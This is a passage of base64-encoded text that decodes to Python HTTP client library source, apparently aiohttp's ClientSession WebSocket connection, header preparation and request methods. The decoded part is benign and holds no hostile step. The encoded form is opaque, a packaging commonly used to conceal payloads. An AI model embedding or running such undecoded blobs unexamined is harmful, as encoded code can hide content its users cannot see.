ShwYXJhbXMpLCBoZWFkZXJzLCByZXNwXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHJldHVybiByZXNwXHJcblxyXG4gICAgICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICMgY2xlYW51cCB0aW1lclxyXG4gICAgICAgICAgICB0bS5jbG9zZSgpXHJcbiAgICAgICAgICAgIGlmIGhhbmRsZTpcclxuICAgICAgICAgICAgICAgIGhhbmRsZS5jYW5jZWwoKVxyXG4gICAgICAgICAgICAgICAgaGFuZGxlID0gTm9uZVxyXG5cclxuICAgICAgICAgICAgZm9yIHRyYWNlIGluIHRyYWNlczpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfcmVxdWVzdF9leGNlcHRpb24oXHJcbiAgICAgICAgICAgICAgICAgICAgbWV0aG9kLCB1cmwudXBkYXRlX3F1ZXJ5KHBhcmFtcyksIGhlYWRlcnMsIGVcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgcmFpc2VcclxuXHJcbiAgICBkZWYgd3NfY29ubmVjdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHVybDogU3RyT3JVUkwsXHJcbiAgICAgICAgKixcclxuICAgICAgICBtZXRob2Q6IHN0ciA9IGhkcnMuTUVUSF9HRVQsXHJcbiAgICAgICAgcHJvdG9jb2xzOiBJdGVyYWJsZVtzdHJdID0gKCksXHJcbiAgICAgICAgdGltZW91dDogZmxvYXQgPSAxMC4wLFxyXG4gICAgICAgIHJlY2VpdmVfdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSxcclxuICAgICAgICBhdXRvY2xvc2U6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIGF1dG9waW5nOiBib29sID0gVHJ1ZSxcclxuICAgICAgICBoZWFydGJlYXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUsXHJcbiAgICAgICAgYXV0aDogT3B0aW9uYWxbQmFzaWNBdXRoXSA9IE5vbmUsXHJcbiAgICAgICAgb3JpZ2luOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBwYXJhbXM6IE9wdGlvbmFsW01hcHBpbmdbc3RyLCBzdHJdXSA9IE5vbmUsXHJcbiAgICAgICAgaGVhZGVyczogT3B0aW9uYWxbTG9vc2VIZWFkZXJzXSA9IE5vbmUsXHJcbiAgICAgICAgcHJveHk6IE9wdGlvbmFsW1N0ck9yVVJMXSA9IE5vbmUsXHJcbiAgICAgICAgcHJveHlfYXV0aDogT3B0aW9uYWxbQmFzaWNBdXRoXSA9IE5vbmUsXHJcbiAgICAgICAgc3NsOiBVbmlvbltTU0xDb250ZXh0LCBib29sLCBOb25lLCBGaW5nZXJwcmludF0gPSBOb25lLFxyXG4gICAgICAgIHZlcmlmeV9zc2w6IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgICAgICBmaW5nZXJwcmludDogT3B0aW9uYWxbYnl0ZXNdID0gTm9uZSxcclxuICAgICAgICBzc2xfY29udGV4dDogT3B0aW9uYWxbU1NMQ29udGV4dF0gPSBOb25lLFxyXG4gICAgICAgIHByb3h5X2hlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIGNvbXByZXNzOiBpbnQgPSAwLFxyXG4gICAgICAgIG1heF9tc2dfc2l6ZTogaW50ID0gNCAqIDEwMjQgKiAxMDI0LFxyXG4gICAgKSAtPiAiX1dTUmVxdWVzdENvbnRleHRNYW5hZ2VyIjpcclxuICAgICAgICAiIiJJbml0aWF0ZSB3ZWJzb2NrZXQgY29ubmVjdGlvbi4iIiJcclxuICAgICAgICByZXR1cm4gX1dTUmVxdWVzdENvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgICAgICBzZWxmLl93c19jb25uZWN0KFxyXG4gICAgICAgICAgICAgICAgdXJsLFxyXG4gICAgICAgICAgICAgICAgbWV0aG9kPW1ldGhvZCxcclxuICAgICAgICAgICAgICAgIHByb3RvY29scz1wcm90b2NvbHMsXHJcbiAgICAgICAgICAgICAgICB0aW1lb3V0PXRpbWVvdXQsXHJcbiAgICAgICAgICAgICAgICByZWNlaXZlX3RpbWVvdXQ9cmVjZWl2ZV90aW1lb3V0LFxyXG4gICAgICAgICAgICAgICAgYXV0b2Nsb3NlPWF1dG9jbG9zZSxcclxuICAgICAgICAgICAgICAgIGF1dG9waW5nPWF1dG9waW5nLFxyXG4gICAgICAgICAgICAgICAgaGVhcnRiZWF0PWhlYXJ0YmVhdCxcclxuICAgICAgICAgICAgICAgIGF1dGg9YXV0aCxcclxuICAgICAgICAgICAgICAgIG9yaWdpbj1vcmlnaW4sXHJcbiAgICAgICAgICAgICAgICBwYXJhbXM9cGFyYW1zLFxyXG4gICAgICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgcHJveHk9cHJveHksXHJcbiAgICAgICAgICAgICAgICBwcm94eV9hdXRoPXByb3h5X2F1dGgsXHJcbiAgICAgICAgICAgICAgICBzc2w9c3NsLFxyXG4gICAgICAgICAgICAgICAgdmVyaWZ5X3NzbD12ZXJpZnlfc3NsLFxyXG4gICAgICAgICAgICAgICAgZmluZ2VycHJpbnQ9ZmluZ2VycHJpbnQsXHJcbiAgICAgICAgICAgICAgICBzc2xfY29udGV4dD1zc2xfY29udGV4dCxcclxuICAgICAgICAgICAgICAgIHByb3h5X2hlYWRlcnM9cHJveHlfaGVhZGVycyxcclxuICAgICAgICAgICAgICAgIGNvbXByZXNzPWNvbXByZXNzLFxyXG4gICAgICAgICAgICAgICAgbWF4X21zZ19zaXplPW1heF9tc2dfc2l6ZSxcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBhc3luYyBkZWYgX3dzX2Nvbm5lY3QoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICB1cmw6IFN0ck9yVVJMLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgbWV0aG9kOiBzdHIgPSBoZHJzLk1FVEhfR0VULFxyXG4gICAgICAgIHByb3RvY29sczogSXRlcmFibGVbc3RyXSA9ICgpLFxyXG4gICAgICAgIHRpbWVvdXQ6IGZsb2F0ID0gMTAuMCxcclxuICAgICAgICByZWNlaXZlX3RpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUsXHJcbiAgICAgICAgYXV0b2Nsb3NlOiBib29sID0gVHJ1ZSxcclxuICAgICAgICBhdXRvcGluZzogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgaGVhcnRiZWF0OiBPcHRpb25hbFtmbG9hdF0gPSBOb25lLFxyXG4gICAgICAgIGF1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgICAgIG9yaWdpbjogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgcGFyYW1zOiBPcHRpb25hbFtNYXBwaW5nW3N0ciwgc3RyXV0gPSBOb25lLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIHByb3h5OiBPcHRpb25hbFtTdHJPclVSTF0gPSBOb25lLFxyXG4gICAgICAgIHByb3h5X2F1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgICAgIHNzbDogVW5pb25bU1NMQ29udGV4dCwgYm9vbCwgTm9uZSwgRmluZ2VycHJpbnRdID0gTm9uZSxcclxuICAgICAgICB2ZXJpZnlfc3NsOiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICAgICAgZmluZ2VycHJpbnQ6IE9wdGlvbmFsW2J5dGVzXSA9IE5vbmUsXHJcbiAgICAgICAgc3NsX2NvbnRleHQ6IE9wdGlvbmFsW1NTTENvbnRleHRdID0gTm9uZSxcclxuICAgICAgICBwcm94eV9oZWFkZXJzOiBPcHRpb25hbFtMb29zZUhlYWRlcnNdID0gTm9uZSxcclxuICAgICAgICBjb21wcmVzczogaW50ID0gMCxcclxuICAgICAgICBtYXhfbXNnX3NpemU6IGludCA9IDQgKiAxMDI0ICogMTAyNCxcclxuICAgICkgLT4gQ2xpZW50V2ViU29ja2V0UmVzcG9uc2U6XHJcblxyXG4gICAgICAgIGlmIGhlYWRlcnMgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmVhbF9oZWFkZXJzID0gQ0lNdWx0aURpY3QoKSAgIyB0eXBlOiBDSU11bHRpRGljdFtzdHJdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmVhbF9oZWFkZXJzID0gQ0lNdWx0aURpY3QoaGVhZGVycylcclxuXHJcbiAgICAgICAgZGVmYXVsdF9oZWFkZXJzID0ge1xyXG4gICAgICAgICAgICBoZHJzLlVQR1JBREU6ICJ3ZWJzb2NrZXQiLFxyXG4gICAgICAgICAgICBoZHJzLkNPTk5FQ1RJT046ICJ1cGdyYWRlIixcclxuICAgICAgICAgICAgaGRycy5TRUNfV0VCU09DS0VUX1ZFUlNJT046ICIxMyIsXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiBkZWZhdWx0X2hlYWRlcnMuaXRlbXMoKTpcclxuICAgICAgICAgICAgcmVhbF9oZWFkZXJzLnNldGRlZmF1bHQoa2V5LCB2YWx1ZSlcclxuXHJcbiAgICAgICAgc2VjX2tleSA9IGJhc2U2NC5iNjRlbmNvZGUob3MudXJhbmRvbSgxNikpXHJcbiAgICAgICAgcmVhbF9oZWFkZXJzW2hkcnMuU0VDX1dFQlNPQ0tFVF9LRVldID0gc2VjX2tleS5kZWNvZGUoKVxyXG5cclxuICAgICAgICBpZiBwcm90b2NvbHM6XHJcbiAgICAgICAgICAgIHJlYWxfaGVhZGVyc1toZHJzLlNFQ19XRUJTT0NLRVRfUFJPVE9DT0xdID0gIiwiLmpvaW4ocHJvdG9jb2xzKVxyXG4gICAgICAgIGlmIG9yaWdpbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmVhbF9oZWFkZXJzW2hkcnMuT1JJR0lOXSA9IG9yaWdpblxyXG4gICAgICAgIGlmIGNvbXByZXNzOlxyXG4gICAgICAgICAgICBleHRzdHIgPSB3c19leHRfZ2VuKGNvbXByZXNzPWNvbXByZXNzKVxyXG4gICAgICAgICAgICByZWFsX2hlYWRlcnNbaGRycy5TRUNfV0VCU09DS0VUX0VYVEVOU0lPTlNdID0gZXh0c3RyXHJcblxyXG4gICAgICAgIHNzbCA9IF9tZXJnZV9zc2xfcGFyYW1zKHNzbCwgdmVyaWZ5X3NzbCwgc3NsX2NvbnRleHQsIGZpbmdlcnByaW50KVxyXG5cclxuICAgICAgICAjIHNlbmQgcmVxdWVzdFxyXG4gICAgICAgIHJlc3AgPSBhd2FpdCBzZWxmLnJlcXVlc3QoXHJcbiAgICAgICAgICAgIG1ldGhvZCxcclxuICAgICAgICAgICAgdXJsLFxyXG4gICAgICAgICAgICBwYXJhbXM9cGFyYW1zLFxyXG4gICAgICAgICAgICBoZWFkZXJzPXJlYWxfaGVhZGVycyxcclxuICAgICAgICAgICAgcmVhZF91bnRpbF9lb2Y9RmFsc2UsXHJcbiAgICAgICAgICAgIGF1dGg9YXV0aCxcclxuICAgICAgICAgICAgcHJveHk9cHJveHksXHJcbiAgICAgICAgICAgIHByb3h5X2F1dGg9cHJveHlfYXV0aCxcclxuICAgICAgICAgICAgc3NsPXNzbCxcclxuICAgICAgICAgICAgcHJveHlfaGVhZGVycz1wcm94eV9oZWFkZXJzLFxyXG4gICAgICAgIClcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAjIGNoZWNrIGhhbmRzaGFrZVxyXG4gICAgICAgICAgICBpZiByZXNwLnN0YXR1cyAhPSAxMDE6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBXU1NlcnZlckhhbmRzaGFrZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3AucmVxdWVzdF9pbmZvLFxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3AuaGlzdG9yeSxcclxuICAgICAgICAgICAgICAgICAgICBtZXNzYWdlPSJJbnZhbGlkIHJlc3BvbnNlIHN0YXR1cyIsXHJcbiAgICAgICAgICAgICAgICAgICAgc3RhdHVzPXJlc3Auc3RhdHVzLFxyXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9cmVzcC5oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgaWYgcmVzcC5oZWFkZXJzLmdldChoZHJzLlVQR1JBREUsICIiKS5sb3dlcigpICE9ICJ3ZWJzb2NrZXQiOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgV1NTZXJ2ZXJIYW5kc2hha2VFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICByZXNwLnJlcXVlc3RfaW5mbyxcclxuICAgICAgICAgICAgICAgICAgICByZXNwLmhpc3RvcnksXHJcbiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZT0iSW52YWxpZCB1cGdyYWRlIGhlYWRlciIsXHJcbiAgICAgICAgICAgICAgICAgICAgc3RhdHVzPXJlc3Auc3RhdHVzLFxyXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9cmVzcC5oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgaWYgcmVzcC5oZWFkZXJzLmdldChoZHJzLkNPTk5FQ1RJT04sICIiKS5sb3dlcigpICE9ICJ1cGdyYWRlIjpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFdTU2VydmVySGFuZHNoYWtlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgcmVzcC5yZXF1ZXN0X2luZm8sXHJcbiAgICAgICAgICAgICAgICAgICAgcmVzcC5oaXN0b3J5LFxyXG4gICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U9IkludmFsaWQgY29ubmVjdGlvbiBoZWFkZXIiLFxyXG4gICAgICAgICAgICAgICAgICAgIHN0YXR1cz1yZXNwLnN0YXR1cyxcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzPXJlc3AuaGVhZGVycyxcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICMga2V5IGNhbGN1bGF0aW9uXHJcbiAgICAgICAgICAgIHJfa2V5ID0gcmVzcC5oZWFkZXJzLmdldChoZHJzLlNFQ19XRUJTT0NLRVRfQUNDRVBULCAiIilcclxuICAgICAgICAgICAgbWF0Y2ggPSBiYXNlNjQuYjY0ZW5jb2RlKGhhc2hsaWIuc2hhMShzZWNfa2V5ICsgV1NfS0VZKS5kaWdlc3QoKSkuZGVjb2RlKClcclxuICAgICAgICAgICAgaWYgcl9rZXkgIT0gbWF0Y2g6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBXU1NlcnZlckhhbmRzaGFrZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3AucmVxdWVzdF9pbmZvLFxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3AuaGlzdG9yeSxcclxuICAgICAgICAgICAgICAgICAgICBtZXNzYWdlPSJJbnZhbGlkIGNoYWxsZW5nZSByZXNwb25zZSIsXHJcbiAgICAgICAgICAgICAgICAgICAgc3RhdHVzPXJlc3Auc3RhdHVzLFxyXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9cmVzcC5oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgIyB3ZWJzb2NrZXQgcHJvdG9jb2xcclxuICAgICAgICAgICAgcHJvdG9jb2wgPSBOb25lXHJcbiAgICAgICAgICAgIGlmIHByb3RvY29scyBhbmQgaGRycy5TRUNfV0VCU09DS0VUX1BST1RPQ09MIGluIHJlc3AuaGVhZGVyczpcclxuICAgICAgICAgICAgICAgIHJlc3BfcHJvdG9jb2xzID0gW1xyXG4gICAgICAgICAgICAgICAgICAgIHByb3RvLnN0cmlwKClcclxuICAgICAgICAgICAgICAgICAgICBmb3IgcHJvdG8gaW4gcmVzcC5oZWFkZXJzW2hkcnMuU0VDX1dFQlNPQ0tFVF9QUk9UT0NPTF0uc3BsaXQoIiwiKVxyXG4gICAgICAgICAgICAgICAgXVxyXG5cclxuICAgICAgICAgICAgICAgIGZvciBwcm90byBpbiByZXNwX3Byb3RvY29sczpcclxuICAgICAgICAgICAgICAgICAgICBpZiBwcm90byBpbiBwcm90b2NvbHM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb3RvY29sID0gcHJvdG9cclxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuXHJcbiAgICAgICAgICAgICMgd2Vic29ja2V0IGNvbXByZXNzXHJcbiAgICAgICAgICAgIG5vdGFrZW92ZXIgPSBGYWxzZVxyXG4gICAgICAgICAgICBpZiBjb21wcmVzczpcclxuICAgICAgICAgICAgICAgIGNvbXByZXNzX2hkcnMgPSByZXNwLmhlYWRlcnMuZ2V0KGhkcnMuU0VDX1dFQlNPQ0tFVF9FWFRFTlNJT05TKVxyXG4gICAgICAgICAgICAgICAgaWYgY29tcHJlc3NfaGRyczpcclxuICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbXByZXNzLCBub3Rha2VvdmVyID0gd3NfZXh0X3BhcnNlKGNvbXByZXNzX2hkcnMpXHJcbiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFdTSGFuZHNoYWtlRXJyb3IgYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBXU1NlcnZlckhhbmRzaGFrZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcC5yZXF1ZXN0X2luZm8sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwLmhpc3RvcnksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlPWV4Yy5hcmdzWzBdLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzPXJlc3Auc3RhdHVzLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycz1yZXNwLmhlYWRlcnMsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICkgZnJvbSBleGNcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgY29tcHJlc3MgPSAwXHJcbiAgICAgICAgICAgICAgICAgICAgbm90YWtlb3ZlciA9IEZhbHNlXHJcblxyXG4gICAgICAgICAgICBjb25uID0gcmVzcC5jb25uZWN0aW9uXHJcbiAgICAgICAgICAgIGFzc2VydCBjb25uIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIGNvbm5fcHJvdG8gPSBjb25uLnByb3RvY29sXHJcbiAgICAgICAgICAgIGFzc2VydCBjb25uX3Byb3RvIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgIHRyYW5zcG9ydCA9IGNvbm4udHJhbnNwb3J0XHJcbiAgICAgICAgICAgIGFzc2VydCB0cmFuc3BvcnQgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgcmVhZGVyID0gRmxvd0NvbnRyb2xEYXRhUXVldWUoXHJcbiAgICAgICAgICAgICAgICBjb25uX3Byb3RvLCAyICoqIDE2LCBsb29wPXNlbGYuX2xvb3BcclxuICAgICAgICAgICAgKSAgIyB0eXBlOiBGbG93Q29udHJvbERhdGFRdWV1ZVtXU01lc3NhZ2VdXHJcbiAgICAgICAgICAgIGNvbm5fcHJvdG8uc2V0X3BhcnNlcihXZWJTb2NrZXRSZWFkZXIocmVhZGVyLCBtYXhfbXNnX3NpemUpLCByZWFkZXIpXHJcbiAgICAgICAgICAgIHdyaXRlciA9IFdlYlNvY2tldFdyaXRlcihcclxuICAgICAgICAgICAgICAgIGNvbm5fcHJvdG8sXHJcbiAgICAgICAgICAgICAgICB0cmFuc3BvcnQsXHJcbiAgICAgICAgICAgICAgICB1c2VfbWFzaz1UcnVlLFxyXG4gICAgICAgICAgICAgICAgY29tcHJlc3M9Y29tcHJlc3MsXHJcbiAgICAgICAgICAgICAgICBub3Rha2VvdmVyPW5vdGFrZW92ZXIsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBleGNlcHQgQmFzZUV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgcmVzcC5jbG9zZSgpXHJcbiAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3dzX3Jlc3BvbnNlX2NsYXNzKFxyXG4gICAgICAgICAgICAgICAgcmVhZGVyLFxyXG4gICAgICAgICAgICAgICAgd3JpdGVyLFxyXG4gICAgICAgICAgICAgICAgcHJvdG9jb2wsXHJcbiAgICAgICAgICAgICAgICByZXNwLFxyXG4gICAgICAgICAgICAgICAgdGltZW91dCxcclxuICAgICAgICAgICAgICAgIGF1dG9jbG9zZSxcclxuICAgICAgICAgICAgICAgIGF1dG9waW5nLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fbG9vcCxcclxuICAgICAgICAgICAgICAgIHJlY2VpdmVfdGltZW91dD1yZWNlaXZlX3RpbWVvdXQsXHJcbiAgICAgICAgICAgICAgICBoZWFydGJlYXQ9aGVhcnRiZWF0LFxyXG4gICAgICAgICAgICAgICAgY29tcHJlc3M9Y29tcHJlc3MsXHJcbiAgICAgICAgICAgICAgICBjbGllbnRfbm90YWtlb3Zlcj1ub3Rha2VvdmVyLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9wcmVwYXJlX2hlYWRlcnMoc2VsZiwgaGVhZGVyczogT3B0aW9uYWxbTG9vc2VIZWFkZXJzXSkgLT4gIkNJTXVsdGlEaWN0W3N0cl0iOlxyXG4gICAgICAgICIiIkFkZCBkZWZhdWx0IGhlYWRlcnMgYW5kIHRyYW5zZm9ybSBpdCB0byBDSU11bHRpRGljdCIiIlxyXG4gICAgICAgICMgQ29udmVydCBoZWFkZXJzIHRvIE11bHRpRGljdFxyXG4gICAgICAgIHJlc3VsdCA9IENJTXVsdGlEaWN0KHNlbGYuX2RlZmF1bHRfaGVhZGVycylcclxuICAgICAgICBpZiBoZWFkZXJzOlxyXG4gICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShoZWFkZXJzLCAoTXVsdGlEaWN0UHJveHksIE11bHRpRGljdCkpOlxyXG4gICAgICAgICAgICAgICAgaGVhZGVycyA9IENJTXVsdGlEaWN0KGhlYWRlcnMpXHJcbiAgICAgICAgICAgIGFkZGVkX25hbWVzID0gc2V0KCkgICMgdHlwZTogU2V0W3N0cl1cclxuICAgICAgICAgICAgZm9yIGtleSwgdmFsdWUgaW4gaGVhZGVycy5pdGVtcygpOlxyXG4gICAgICAgICAgICAgICAgaWYga2V5IGluIGFkZGVkX25hbWVzOlxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdC5hZGQoa2V5LCB2YWx1ZSlcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgcmVzdWx0W2tleV0gPSB2YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgIGFkZGVkX25hbWVzLmFkZChrZXkpXHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdFxyXG5cclxuICAgIGRlZiBnZXQoXHJcbiAgICAgICAgc2VsZiwgdXJsOiBTdHJPclVSTCwgKiwgYWxsb3dfcmVkaXJlY3RzOiBib29sID0gVHJ1ZSwgKiprd2FyZ3M6IEFueVxyXG4gICAgKSAtPiAiX1JlcXVlc3RDb250ZXh0TWFuYWdlciI6XHJcbiAgICAgICAgIiIiUGVyZm9ybSBIVFRQIEdFVCByZXF1ZXN0LiIiIlxyXG4gICAgICAgIHJldHVybiBfUmVxdWVzdENvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgICAgICBzZWxmLl9yZXF1ZXN0KGhkcnMuTUVUSF9HRVQsIHVybCwgYWxsb3dfcmVkaXJlY3RzPWFsbG93X3JlZGlyZWN0cywgKiprd2FyZ3MpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBvcHRpb25zKFxyXG4gICAgICAgIHNlbGYsIHVybDogU3RyT3JVUkwsICosIGFsbG93X3JlZGlyZWN0czogYm9vbCA9IFRydWUsICoqa3dhcmdzOiBBbnlcclxuICAgICkgLT4gIl9SZXF1ZXN0Q29udGV4dE1hbmFnZXIiOlxyXG4gICAgICAgICIiIlBlcmZvcm0gSFRUUCBPUFRJT05TIHJlcXVlc3QuIiIiXHJcbiAgICAgICAgcmV0dXJuIF9SZXF1ZXN0Q29udGV4dE1hbmFnZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX3JlcXVlc3QoXHJcbiAgICAgICAgICAgICAgICBoZHJzLk1FVEhfT1BUSU9OUywgdXJsLCBhbGxvd19yZWRpcmVjdHM9YWxsb3dfcmVkaXJlY3RzLCAqKmt3YXJnc1xyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBoZWFkKFxyXG4gICAgICAgIHNlbGYsIHVybDogU3RyT3JVUkwsICosIGFsbG93X3JlZGlyZWN0czogYm9vbCA9IEZhbHNlLCAqKmt3YXJnczogQW55XHJcbiAgICApIC0+ICJfUmVxdWVzdENvbnRleHRNYW5hZ2VyIjpcclxuICAgICAgICAiIiJQZXJmb3JtIEhUVFAgSEVBRCByZXF1ZXN0LiIiIlxyXG4gICAgICAgIHJldHVybiBfUmVxdWVzdENvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgICAgICBzZWxmLl9yZXF1ZXN0KFxyXG4gICAgICAgICAgICAgICAgaGRycy5NRVRIX0hFQUQsIHVybCwgYWxsb3dfcmVkaXJlY3RzPWFsbG93X3JlZGlyZWN0cywgKiprd2FyZ3NcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcG9zdChcclxuICAgICAgICBzZWxmLCB1cmw6IFN0ck9yVVJMLCAqLCBkYXRhOiBBbnkgPSBOb25lLCAqKmt3YXJnczogQW55XHJcbiAgICApIC0+ICJfUmVxdWVzdENvbnRleHRNYW5hZ2VyIjpcclxuICAgICAgICAiIiJQZXJmb3JtIEhUVFAgUE9TVCByZXF1ZXN0LiIiIlxyXG4gICAgICAgIHJldHVybiBfUmVxdWVzdENvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgICAgICBzZWxmLl9yZXF1ZXN0KGhkcnMuTUVUSF9QT1NULCB1cmwsIGRhdGE9ZGF0YSwgKiprd2FyZ3MpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBwdXQoXHJcbiAgICAgICAgc2VsZiwgdXJsOiBTdHJPclVSTCwgKiwgZGF0YTogQW55ID0gTm9uZSwgKiprd2FyZ3M6IEFueVxyXG4gICAgKSAtPiAiX1JlcXVlc3RDb250ZXh0TWFuYWdlciI6XHJcbiAgICAgICAgIiIiUGVyZm9ybSBIVFRQIFBVVCByZXF1ZXN0LiIiIlxyXG4gICAgICAgIHJldHVybiBfUmVxdWVzdENvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgICAgICBzZWxmLl9yZXF1ZXN0KGhkcnMuTUVUSF9QVVQsIHVybCwgZGF0YT1kYXRhLCAqKmt3YXJncylcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHBhdGNoKFxyXG4gICAgICAgIHNlbGYsIHVybDogU3RyT3JVUkwsICosIGRhdGE6IEFueSA9IE5vbmUsICoqa3dhcmdzOiBBbnlcclxuICAgICkgLT4gIl9SZXF1ZXN0Q29udGV4dE1hbmFnZXIiOlxyXG4gICAgICAgICIiIlBlcmZvcm0gSFRUUCBQQVRDSCByZXF1ZXN0LiIiIlxyXG4gICAgICAgIHJldHVybiBfUmVxdWVzdENvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgICAgICBzZWxmLl9yZXF1ZXN0KGhkcnMuTUVUSF9QQVRDSCwgdXJsLCBkYXRhPWRhdGEsICoqa3dhcmdzKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgZGVsZXRlKHNlbGYsIHVybDogU3RyT3JVUkwsICoqa3dhcmdzOiBBbnkpIC0+ICJfUmVxdWVzdENvbnRleHRNYW5hZ2VyIjpcclxuICAgICAgICAiIiJQZXJmb3JtIEhUVFAgREVMRVRFIHJlcXVlc3QuIiIiXHJcbiAgICAgICAgcmV0dXJuIF9SZXF1ZXN0Q29udGV4dE1hbmFnZXIoc2VsZi5fcmVxdWVzdChoZHJzLk1FVEhfREVMRVRFLCB1cmwsICoqa3dhcmdzKSlcclxuXHJcbiAgICBhc3luYyBkZWYgY2xvc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJDbG9zZSB1bmRlcmx5aW5nIGNvbm5lY3Rvci5cclxuXHJcbiAgICAgICAgUmVsZWFzZSBhbGwgYWNxdWlyZWQgcmVzb3VyY2VzLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCBzZWxmLmNsb3NlZDpcclxuICAgICAgICAgICAgaWYgc2VsZi5fY29ubmVjdG9yIGlzIG5vdCBOb25lIGFuZCBzZWxmLl9jb25uZWN0b3Jfb3duZXI6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLl9jb25uZWN0b3IuY2xvc2UoKVxyXG4gICAgICAgICAgICBzZWxmLl9jb25uZWN0b3IgPS